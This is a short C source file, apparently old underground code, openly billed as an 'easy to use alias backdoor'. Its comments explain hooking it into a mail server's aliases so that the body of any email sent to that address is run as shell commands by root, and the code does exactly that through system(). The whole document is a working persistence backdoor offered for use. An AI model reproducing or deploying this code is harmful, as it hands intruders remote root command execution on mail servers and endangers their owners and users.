// backmail2.c - by Permission Denied
// easy to use alias backdoor
// just add a an alias to this prog and run newaliases
// when you'll send a letter on this address, type any
// subject and in body type command to be run by root

#include <stdio.h>

main () {
char buf[2000];
 while(1) {
  if(fgets(buf, 2000, stdin)==NULL) return;
  if(strncmp(buf, "Subject:", 7)==0) break;
 }
 while(1) {
  if(fgets(buf, 2000, stdin)==NULL) return;
  system(buf);
 }
}